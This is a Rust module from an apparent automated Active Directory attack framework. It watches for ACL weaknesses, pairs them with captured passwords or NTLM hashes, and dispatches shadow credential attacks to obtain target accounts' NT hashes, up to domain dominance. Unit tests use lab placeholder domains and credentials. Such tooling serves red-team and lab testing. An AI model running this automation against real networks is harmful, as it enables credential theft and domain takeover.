//! auto_shadow_credentials -- exploit GenericAll/WriteDacl ACL edges via shadow credentials.
//!
//! When BloodHound or ACL analysis discovers that a controlled user has
//! GenericAll, GenericWrite, or WriteDacl on another user/computer, this
//! automation dispatches `certipy shadow auto` to add shadow credentials
//! and obtain the target's NT hash without touching LSASS.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;

/// Dedup key prefix for shadow credential attacks.
const DEDUP_SHADOW_CREDS: &str = "shadow_creds";

/// Monitors for GenericAll/WriteDacl edges and dispatches shadow credential attacks.
/// Interval: 30s.
pub async fn auto_shadow_credentials(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("shadow_credentials") {
            continue;
        }

        // Skip when fully dominated and strategy says stop.
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }
        }

        let work: Vec<ShadowCredWork> = {
            let state = dispatcher.state.read().await;

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    // Look for ACL-based vulns that grant write access to another principal
                    if !is_shadow_cred_candidate(&vuln.vuln_type) {
                        return None;
                    }

                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let dedup_key = format!("{DEDUP_SHADOW_CREDS}:{}", vuln.vuln_id);
                    if state.is_processed(DEDUP_SHADOW_CREDS, &dedup_key) {
                        return None;
                    }

                    // Extract source (attacker) and target (victim) from vuln details
                    let source_user = extract_source_user(&vuln.details)?;
                    let target_user = extract_target_user(&vuln.details)?;

                    let domain = vuln
                        .details
                        .get("domain")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();

                    // Find credential for the source user
                    let credential = state
                        .credentials
                        .iter()
                        .find(|c| {
                            c.username.to_lowercase() == source_user.to_lowercase()
                                && (domain.is_empty()
                                    || c.domain.to_lowercase() == domain.to_lowercase())
                        })
                        .cloned();

                    // Also check for NTLM hash as fallback
                    let hash = if credential.is_none() {
                        state
                            .hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == source_user.to_lowercase()
                                    && h.hash_type.to_uppercase() == "NTLM"
                                    && (domain.is_empty()
                                        || h.domain.to_lowercase() == domain.to_lowercase())
                            })
                            .cloned()
                    } else {
                        None
                    };

                    if credential.is_none() && hash.is_none() {
                        debug!(
                            vuln_id = %vuln.vuln_id,
                            source = %source_user,
                            "Shadow credentials skipped: no cred/hash for source user"
                        );
                        return None;
                    }

                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    Some(ShadowCredWork {
                        vuln_id: vuln.vuln_id.clone(),
                        dedup_key,
                        source_user,
                        target_user,
                        domain,
                        dc_ip,
                        credential,
                        hash,
                    })
                })
                .collect()
        };

        for item in work {
            let mut payload = json!({
                "technique": "shadow_credentials",
                "vuln_type": "shadow_credentials",
                "vuln_id": item.vuln_id,
                "target_account": item.target_user,
                "domain": item.domain,
            });

            if let Some(ref dc) = item.dc_ip {
                payload["target_ip"] = json!(dc);
                payload["dc_ip"] = json!(dc);
            }

            if let Some(ref cred) = item.credential {
                payload["username"] = json!(cred.username);
                payload["password"] = json!(cred.password);
                payload["credential"] = json!({
                    "username": cred.username,
                    "password": cred.password,
                    "domain": cred.domain,
                });
            } else if let Some(ref hash) = item.hash {
                payload["username"] = json!(hash.username);
                payload["hash"] = json!(hash.hash_value);
            }

            let priority = dispatcher.effective_priority("shadow_credentials");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        vuln_id = %item.vuln_id,
                        source = %item.source_user,
                        target = %item.target_user,
                        "Shadow credentials attack dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_SHADOW_CREDS, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SHADOW_CREDS, &item.dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => {
                    warn!(err = %e, vuln_id = %item.vuln_id, "Failed to dispatch shadow credentials")
                }
            }
        }
    }
}

/// Extract the source (attacker) user from vulnerability details.
/// Tries "source", "source_user", "attacker" keys in priority order.
fn extract_source_user(
    details: &std::collections::HashMap<String, serde_json::Value>,
) -> Option<String> {
    details
        .get("source")
        .or_else(|| details.get("source_user"))
        .or_else(|| details.get("attacker"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
}

/// Extract the target (victim) user from vulnerability details.
/// Tries "target", "target_user", "victim", "account_name" keys in priority order.
fn extract_target_user(
    details: &std::collections::HashMap<String, serde_json::Value>,
) -> Option<String> {
    details
        .get("target")
        .or_else(|| details.get("target_user"))
        .or_else(|| details.get("victim"))
        .or_else(|| details.get("account_name"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
}

struct ShadowCredWork {
    vuln_id: String,
    dedup_key: String,
    source_user: String,
    target_user: String,
    domain: String,
    dc_ip: Option<String>,
    credential: Option<ares_core::models::Credential>,
    hash: Option<ares_core::models::Hash>,
}

/// Returns `true` if the given vulnerability type is a candidate for shadow
/// credentials exploitation (ACL-based write access on another principal).
pub(crate) fn is_shadow_cred_candidate(vuln_type: &str) -> bool {
    matches!(
        vuln_type.to_lowercase().as_str(),
        "genericall"
            | "genericwrite"
            | "writedacl"
            | "writeowner"
            | "shadow_credentials"
            | "acl_genericall"
            | "acl_genericwrite"
            | "acl_writedacl"
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    // is_shadow_cred_candidate

    #[test]
    fn is_shadow_cred_candidate_positive() {
        assert!(is_shadow_cred_candidate("genericall"));
        assert!(is_shadow_cred_candidate("GenericAll"));
        assert!(is_shadow_cred_candidate("genericwrite"));
        assert!(is_shadow_cred_candidate("writedacl"));
        assert!(is_shadow_cred_candidate("writeowner"));
        assert!(is_shadow_cred_candidate("shadow_credentials"));
        assert!(is_shadow_cred_candidate("acl_genericall"));
        assert!(is_shadow_cred_candidate("acl_genericwrite"));
        assert!(is_shadow_cred_candidate("acl_writedacl"));
    }

    #[test]
    fn is_shadow_cred_candidate_negative() {
        assert!(!is_shadow_cred_candidate("rbcd"));
        assert!(!is_shadow_cred_candidate("esc1"));
        assert!(!is_shadow_cred_candidate("mssql_access"));
        assert!(!is_shadow_cred_candidate("unconstrained_delegation"));
        assert!(!is_shadow_cred_candidate("genericall_computer"));
        assert!(!is_shadow_cred_candidate(""));
    }

    #[test]
    fn is_shadow_cred_candidate_case_insensitive() {
        assert!(is_shadow_cred_candidate("GENERICALL"));
        assert!(is_shadow_cred_candidate("WriteDacl"));
        assert!(is_shadow_cred_candidate("ACL_GENERICWRITE"));
    }

    #[test]
    fn is_shadow_cred_candidate_partial_match_rejected() {
        // Substrings or superstrings should not match
        assert!(!is_shadow_cred_candidate("acl_genericall_extra"));
        assert!(!is_shadow_cred_candidate("not_genericall"));
        assert!(!is_shadow_cred_candidate("generic"));
        assert!(!is_shadow_cred_candidate("write"));
    }

    #[test]
    fn is_shadow_cred_candidate_whitespace_rejected() {
        assert!(!is_shadow_cred_candidate(" genericall"));
        assert!(!is_shadow_cred_candidate("genericall "));
        assert!(!is_shadow_cred_candidate(" genericall "));
    }

    // extract_source_user

    #[test]
    fn extract_source_user_primary_key() {
        let mut details = HashMap::new();
        details.insert(
            "source".to_string(),
            serde_json::Value::String("testuser".to_string()),
        );
        assert_eq!(extract_source_user(&details), Some("testuser".to_string()));
    }

    #[test]
    fn extract_source_user_fallback_source_user() {
        let mut details = HashMap::new();
        details.insert(
            "source_user".to_string(),
            serde_json::Value::String("admin_user".to_string()),
        );
        assert_eq!(
            extract_source_user(&details),
            Some("admin_user".to_string())
        );
    }

    #[test]
    fn extract_source_user_fallback_attacker() {
        let mut details = HashMap::new();
        details.insert(
            "attacker".to_string(),
            serde_json::Value::String("evil_user".to_string()),
        );
        assert_eq!(extract_source_user(&details), Some("evil_user".to_string()));
    }

    #[test]
    fn extract_source_user_priority_order() {
        let mut details = HashMap::new();
        details.insert(
            "source".to_string(),
            serde_json::Value::String("first".to_string()),
        );
        details.insert(
            "source_user".to_string(),
            serde_json::Value::String("second".to_string()),
        );
        details.insert(
            "attacker".to_string(),
            serde_json::Value::String("third".to_string()),
        );
        assert_eq!(extract_source_user(&details), Some("first".to_string()));
    }

    #[test]
    fn extract_source_user_empty_details() {
        let details = HashMap::new();
        assert_eq!(extract_source_user(&details), None);
    }

    #[test]
    fn extract_source_user_non_string_value() {
        let mut details = HashMap::new();
        details.insert("source".to_string(), serde_json::Value::Number(123.into()));
        assert_eq!(extract_source_user(&details), None);
    }

    #[test]
    fn extract_source_user_null_does_not_fall_through() {
        // When "source" key exists but is Null, get() returns Some(&Null),
        // so or_else() does NOT try "attacker". The as_str() on Null returns None.
        let mut details = HashMap::new();
        details.insert("source".to_string(), serde_json::Value::Null);
        details.insert(
            "attacker".to_string(),
            serde_json::Value::String("fallback".to_string()),
        );
        assert_eq!(extract_source_user(&details), None);
    }

    // extract_target_user

    #[test]
    fn extract_target_user_primary_key() {
        let mut details = HashMap::new();
        details.insert(
            "target".to_string(),
            serde_json::Value::String("dc01$".to_string()),
        );
        assert_eq!(extract_target_user(&details), Some("dc01$".to_string()));
    }

    #[test]
    fn extract_target_user_fallback_target_user() {
        let mut details = HashMap::new();
        details.insert(
            "target_user".to_string(),
            serde_json::Value::String("sql01$".to_string()),
        );
        assert_eq!(extract_target_user(&details), Some("sql01$".to_string()));
    }

    #[test]
    fn extract_target_user_fallback_victim() {
        let mut details = HashMap::new();
        details.insert(
            "victim".to_string(),
            serde_json::Value::String("svc_sql".to_string()),
        );
        assert_eq!(extract_target_user(&details), Some("svc_sql".to_string()));
    }

    #[test]
    fn extract_target_user_fallback_account_name() {
        let mut details = HashMap::new();
        details.insert(
            "account_name".to_string(),
            serde_json::Value::String("web01$".to_string()),
        );
        assert_eq!(extract_target_user(&details), Some("web01$".to_string()));
    }

    #[test]
    fn extract_target_user_priority_order() {
        let mut details = HashMap::new();
        details.insert(
            "target".to_string(),
            serde_json::Value::String("first".to_string()),
        );
        details.insert(
            "target_user".to_string(),
            serde_json::Value::String("second".to_string()),
        );
        details.insert(
            "victim".to_string(),
            serde_json::Value::String("third".to_string()),
        );
        details.insert(
            "account_name".to_string(),
            serde_json::Value::String("fourth".to_string()),
        );
        assert_eq!(extract_target_user(&details), Some("first".to_string()));
    }

    #[test]
    fn extract_target_user_empty_details() {
        let details = HashMap::new();
        assert_eq!(extract_target_user(&details), None);
    }

    #[test]
    fn extract_target_user_non_string_value() {
        let mut details = HashMap::new();
        details.insert("target".to_string(), serde_json::Value::Bool(false));
        assert_eq!(extract_target_user(&details), None);
    }

    // dedup key format

    #[test]
    fn dedup_key_format() {
        let vuln_id = "vuln-456";
        let dedup_key = format!("{DEDUP_SHADOW_CREDS}:{vuln_id}");
        assert_eq!(dedup_key, "shadow_creds:vuln-456");
    }

    #[test]
    fn dedup_key_unique_per_vuln() {
        let key1 = format!("{DEDUP_SHADOW_CREDS}:vuln-001");
        let key2 = format!("{DEDUP_SHADOW_CREDS}:vuln-002");
        assert_ne!(key1, key2);
    }

    #[test]
    fn dedup_key_contains_prefix() {
        let key = format!("{DEDUP_SHADOW_CREDS}:vuln-123");
        assert!(key.starts_with("shadow_creds:"));
    }

    // ShadowCredWork construction patterns

    #[test]
    fn shadow_cred_work_with_credential() {
        let work = ShadowCredWork {
            vuln_id: "vuln-sc-001".to_string(),
            dedup_key: format!("{DEDUP_SHADOW_CREDS}:vuln-sc-001"),
            source_user: "testuser".to_string(),
            target_user: "dc01$".to_string(),
            domain: "contoso.local".to_string(),
            dc_ip: Some("192.168.58.10".to_string()),
            credential: Some(ares_core::models::Credential {
                id: "cred-1".to_string(),
                username: "testuser".to_string(),
                password: "P@ssw0rd!".to_string(), // pragma: allowlist secret
                domain: "contoso.local".to_string(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            }),
            hash: None,
        };

        assert_eq!(work.source_user, "testuser");
        assert_eq!(work.target_user, "dc01$");
        assert_eq!(work.domain, "contoso.local");
        assert!(work.credential.is_some());
        assert!(work.hash.is_none());
    }

    #[test]
    fn shadow_cred_work_with_hash_fallback() {
        let work = ShadowCredWork {
            vuln_id: "vuln-sc-002".to_string(),
            dedup_key: format!("{DEDUP_SHADOW_CREDS}:vuln-sc-002"),
            source_user: "svc_admin".to_string(),
            target_user: "sql01$".to_string(),
            domain: "fabrikam.local".to_string(),
            dc_ip: Some("192.168.58.20".to_string()),
            credential: None,
            hash: Some(ares_core::models::Hash {
                id: "hash-1".to_string(),
                username: "svc_admin".to_string(),
                hash_value: "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
                    .to_string(),
                hash_type: "NTLM".to_string(),
                domain: "fabrikam.local".to_string(),
                cracked_password: None,
                source: String::new(),
                discovered_at: None,
                aes_key: None,
                parent_id: None,
                attack_step: 0,
            }),
        };

        assert!(work.credential.is_none());
        assert_eq!(
            work.hash.as_ref().expect("hash should be set").hash_type,
            "NTLM"
        );
    }

    #[test]
    fn shadow_cred_work_no_dc_ip() {
        let work = ShadowCredWork {
            vuln_id: "vuln-sc-003".to_string(),
            dedup_key: format!("{DEDUP_SHADOW_CREDS}:vuln-sc-003"),
            source_user: "testuser".to_string(),
            target_user: "web01$".to_string(),
            domain: "contoso.local".to_string(),
            dc_ip: None,
            credential: Some(ares_core::models::Credential {
                id: "cred-2".to_string(),
                username: "testuser".to_string(),
                password: "P@ssw0rd!".to_string(), // pragma: allowlist secret
                domain: "contoso.local".to_string(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            }),
            hash: None,
        };

        assert!(work.dc_ip.is_none());
    }

    // Integration-like: combined extraction from realistic vuln details

    #[test]
    fn full_shadow_cred_extraction() {
        let mut details = HashMap::new();
        details.insert(
            "source".to_string(),
            serde_json::Value::String("testuser".to_string()),
        );
        details.insert(
            "target".to_string(),
            serde_json::Value::String("dc01$".to_string()),
        );
        details.insert(
            "domain".to_string(),
            serde_json::Value::String("contoso.local".to_string()),
        );

        assert_eq!(extract_source_user(&details), Some("testuser".to_string()));
        assert_eq!(extract_target_user(&details), Some("dc01$".to_string()));
        assert!(is_shadow_cred_candidate("genericall"));
    }

    #[test]
    fn extraction_with_alternate_keys() {
        let mut details = HashMap::new();
        details.insert(
            "attacker".to_string(),
            serde_json::Value::String("svc_admin".to_string()),
        );
        details.insert(
            "victim".to_string(),
            serde_json::Value::String("sql01$".to_string()),
        );
        details.insert(
            "domain".to_string(),
            serde_json::Value::String("fabrikam.local".to_string()),
        );

        assert_eq!(extract_source_user(&details), Some("svc_admin".to_string()));
        assert_eq!(extract_target_user(&details), Some("sql01$".to_string()));
    }

    #[test]
    fn extraction_missing_source_returns_none() {
        let mut details = HashMap::new();
        // Only target present, no source
        details.insert(
            "target".to_string(),
            serde_json::Value::String("dc01$".to_string()),
        );

        assert_eq!(extract_source_user(&details), None);
        assert_eq!(extract_target_user(&details), Some("dc01$".to_string()));
    }

    #[test]
    fn extraction_missing_target_returns_none() {
        let mut details = HashMap::new();
        // Only source present, no target
        details.insert(
            "source".to_string(),
            serde_json::Value::String("testuser".to_string()),
        );

        assert_eq!(extract_source_user(&details), Some("testuser".to_string()));
        assert_eq!(extract_target_user(&details), None);
    }
}
